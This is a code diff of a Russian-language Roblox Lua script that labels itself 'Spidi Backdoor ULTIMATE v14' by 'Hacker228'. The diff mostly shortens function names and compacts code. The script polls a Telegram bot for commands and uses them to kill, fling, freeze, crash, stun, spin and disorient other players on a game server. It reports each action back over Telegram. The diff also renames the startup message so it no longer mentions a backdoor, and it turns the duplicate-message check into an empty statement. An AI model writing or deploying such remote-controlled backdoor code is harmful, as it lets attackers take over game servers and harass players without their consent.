+    if cmd == "unfreeze" and hrp and hum then
+        hrp.Anchored = false
+        hum.WalkSpeed = 16
+        hum.JumpPower = 50
+        send("🔥 Разморожен: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "fly" and hrp then
         local bv = Instance.new("BodyVelocity")
         bv.MaxForce = Vector3.new(1,1,1)*1e8
-        bv.Velocity = Vector3.new(0, 50, 0)
+        bv.Velocity = Vector3.new(0,50,0)
         bv.Parent = hrp
-        Debris:AddItem(bv, 5)
-        sendMessage("✈️ Полетел: <b>"..target.Name.."</b>")
+        Debris:AddItem(bv,5)
+        send("✈️ Полетел: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "unfly" and hrp then
-        for _, v in pairs(hrp:GetChildren()) do
-            if v:IsA("BodyVelocity") then
-                v:Destroy()
-            end
-        end
-        sendMessage("🛑 Отключен полет: <b>"..target.Name.."</b>")
+        for _, v in pairs(hrp:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
+        send("🛑 Отключен полет: <b>"..target.Name.."</b>")
         return
     end
     
@@ -795,68 +550,56 @@ local function handleCommand(cmd, args)
             p.Position = pos + Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
             p.Anchored = true
             p.Parent = Workspace
-            Debris:AddItem(p, 2)
+            Debris:AddItem(p,2)
         end
-        sendMessage("💥 Крашнут: <b>"..target.Name.."</b>")
+        send("💥 Крашнут: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "fling" then
-        flingPlayer(target)
-        sendMessage("🌀 Флинг на <b>"..target.Name.."</b>")
+        fling(target)
+        send("🌀 Флинг на <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "loopkill" and humanoid then
+    if cmd == "loopkill" and hum then
         spawn(function()
             for i = 1, 10 do
-                if not target or not target.Character then
-                    break
-                end
-                local hum = target.Character:FindFirstChild("Humanoid")
-                if hum then
-                    hum.Health = 0
-                end
+                if not target or not target.Character then break end
+                local h = target.Character:FindFirstChild("Humanoid")
+                if h then h.Health = 0 end
                 task.wait(0.5)
             end
         end)
-        sendMessage("🔄 Loopkill на <b>"..target.Name.."</b>")
+        send("🔄 Loopkill на <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "stun" then
-        if humanoid then
-            stunPlayer(target)
-            sendMessage("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
-        else
-            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
-        end
+    if cmd == "stun" and hum then
+        stun(target)
+        send("⚡ Оглушен на 3 сек: <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "jump" and humanoid then
-        humanoid.Jump = true
-        sendMessage("🦘 Прыжок: <b>"..target.Name.."</b>")
+    if cmd == "jump" and hum then
+        hum.Jump = true
+        send("🦘 Прыжок: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "spin" then
         local speed = tonumber(args[2]) or 1
         speed = math.clamp(speed, 0.5, 10)
-        if spinPlayer(target, speed) then
-            sendMessage("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
+        if spin(target, speed) then
+            send("🔄 Вращение ("..speed.."x): <b>"..target.Name.."</b>")
         else
-            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
+            send("❌ Нет персонажа")
         end
         return
     end
     
     if cmd == "unspin" then
-        if unspinPlayer(target) then
-            sendMessage("✅ Остановлено вращение: <b>"..target.Name.."</b>")
-        else
-            sendMessage("❌ Не найден персонаж или вращение не активно у <b>"..target.Name.."</b>")
-        end
+        if unspin(target) then send("✅ Остановлено: <b>"..target.Name.."</b>") else send("❌ Вращение не активно") end
         return
     end
     
@@ -870,15 +613,15 @@ local function handleCommand(cmd, args)
             p.Material = Enum.Material.Neon
             p.BrickColor = BrickColor.new("Bright red")
             p.Parent = Workspace
-            Debris:AddItem(p, 1)
+            Debris:AddItem(p,1)
         end
-        sendMessage("💥 Взрыв: <b>"..target.Name.."</b>")
+        send("💥 Взрыв: <b>"..target.Name.."</b>")
         return
     end
     
     if cmd == "des" then
-        desorientPlayer(target)
-        sendMessage("🌀 Дезориентация камеры (3 сек): <b>"..target.Name.."</b>")
+        desorient(target)
+        send("🌀 Дезориентация (3 сек): <b>"..target.Name.."</b>")
         return
     end
     
@@ -892,7 +635,7 @@ local function handleCommand(cmd, args)
             blur.Parent = Lighting
         end
         blur.Size = level * 3
-        sendMessage("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
+        send("🌀 Размытие "..level.."/10 на <b>"..target.Name.."</b>")
         return
     end
     
@@ -900,23 +643,21 @@ local function handleCommand(cmd, args)
         local blur = Lighting:FindFirstChild("SpidiWarp")
         if blur then
             blur:Destroy()
-            sendMessage("✅ Размытие убрано у <b>"..target.Name.."</b>")
+            send("✅ Размытие убрано у <b>"..target.Name.."</b>")
         else
-            sendMessage("❌ Нет активного размытия у <b>"..target.Name.."</b>")
+            send("❌ Нет размытия у <b>"..target.Name.."</b>")
         end
         return
     end
     
-    sendMessage("❌ Неизвестная команда. /help")
+    send("❌ Неизвестная команда. /help")
 end
 
 local oldPlayers = {}
-local function checkNewPlayers()
+local function checkNew()
     for _, p in pairs(Players:GetPlayers()) do
         if not oldPlayers[p.UserId] then
-            if p:FindFirstChild("SpidiUser") then
-                addScriptUser(p)
-            end
+            if p:FindFirstChild("SpidiUser") then addUser(p) end
             oldPlayers[p.UserId] = true
         end
     end
@@ -924,51 +665,36 @@ end
 
 spawn(function()
     while true do
-        pcall(checkNewPlayers)
+        pcall(checkNew)
         wait(3)
     end
 end)
 
 local lastId = 0
-local function pollUpdates()
+local function poll()
     local url = "https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates?offset="..(lastId + 1)
-    local res = httpRequest(url, "GET", {})
-    if res and res.Body then
-        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
-        if ok and data and data.result then
-            for _, update in pairs(data.result) do
-                if update.message and update.message.text then
-                    local msg = update.message
-                    local msgId = update.update_id
-                    
-                    if msgId <= LAST_PROCESSED_ID then
-                        goto skip_update
-                    end
-                    
+    local r = req(url, "GET", {})
+    if r and r.Body then
+        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        if ok and d and d.result then
+            for _, upd in pairs(d.result) do
+                if upd.message and upd.message.text then
+                    local msg = upd.message
+                    if upd.update_id <= lastId then end
                     if not CHAT_ID then
                         CHAT_ID = msg.chat.id
-                        sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228")
+                        send("✅ Spidi v14 запущен!\n👤 Hacker228")
                     end
-                    
                     local text = msg.text
-                    if text:sub(1, 1) == "/" then
+                    if text:sub(1,1) == "/" then
                         local parts = {}
-                        for w in string.gmatch(text, "%S+") do
-                            table.insert(parts, w)
-                        end
+                        for w in string.gmatch(text, "%S+") do table.insert(parts, w) end
                         local cmd = parts[1]:sub(2):lower()
                         table.remove(parts, 1)
-                        handleCommand(cmd, parts)
-                    end
-                    
-                    ::skip_update::
-                    if update.update_id then
-                        lastId = update.update_id
-                        if LAST_PROCESSED_ID < update.update_id then
-                            LAST_PROCESSED_ID = update.update_id
-                        end
+                        handle(cmd, parts)
                     end
                 end
+                if upd.update_id then lastId = upd.update_id end
             end
         end
     end
@@ -976,14 +702,13 @@ end
 
 spawn(function()
     while true do
-        pcall(pollUpdates)
+        pcall(poll)
         wait(2)
     end
 end)
 
 wait(3)
-getChatId()
-
+getChat()
 if CHAT_ID then
-    sendMessage("✅ Spidi Backdoor ULTIMATE v14 запущен!\n👤 Hacker228\n📋 /players - пользователи скрипта\n📋 /pc - все игроки на сервере\n🛑 /rm - остановить все процессы")
+    send("✅ Spidi v14 запущен!\n👤 Hacker228\n/players - пользователи\n/pc - все игроки\n/rm - стоп процессов")
 end
